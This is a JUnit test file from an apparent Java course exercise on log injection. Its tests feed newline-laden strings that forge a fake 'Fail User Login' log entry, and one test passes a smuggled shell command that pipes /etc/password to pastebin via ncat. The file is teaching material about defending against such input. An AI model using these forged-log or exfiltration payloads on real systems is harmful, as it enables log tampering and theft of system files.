package edu.aluismarte.diplomado.week7;

import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

/**
 * El objetivo será hacer que se ejecute un log pero
 * a su vez en el proceso se registre otra línea que
 * parezca un log real pero que sea ilegal
 *
 * @author aluis on 5/9/2022.
 */
class Exercise1Week7Test {

    private final Exercise1Week7 exercise1Week7 = new Exercise1Week7();

    @Nested
    class WorseLogTest {

        @Test
        void normalLogTest() {
            exercise1Week7.worseLog("Normal Parameter");
        }

        @Test
        void anormalLogTest() {
            exercise1Week7.worseLog("demo\nFail User Login 45112");
        }
    }

    @Nested
    class BadLogTest {

        @Test
        void normalLogTest() {
            exercise1Week7.badLog("Normal Parameter");
        }

        @Test
        void anormalLogTest1() {
            DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
            exercise1Week7.badLog("demo\n" + dateTimeFormatter.format(LocalTime.now()) + " [Test worker] INFO edu.aluismarte.diplomado.week7.Exercise1Week7 - Fail User Login 45112");
        }

        @Test
        void anormalLogTest2() {
            exercise1Week7.badLog("; me faltan los magic type sh 'cat /etc/password | ncat http://pastebin.com/sodjkoskdoks'");
        }
    }

    @Nested
    class GoodLogTest {

        @Test
        void normalLogTest() {
            exercise1Week7.goodLog("Normal Parameter");
        }

        @Test
        void anormalLogTest() {
            DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
            exercise1Week7.goodLog("demo\n" + dateTimeFormatter.format(LocalTime.now()) + " [Test worker] INFO edu.aluismarte.diplomado.week7.Exercise1Week7 - Fail User Login 45112");
        }
    }

}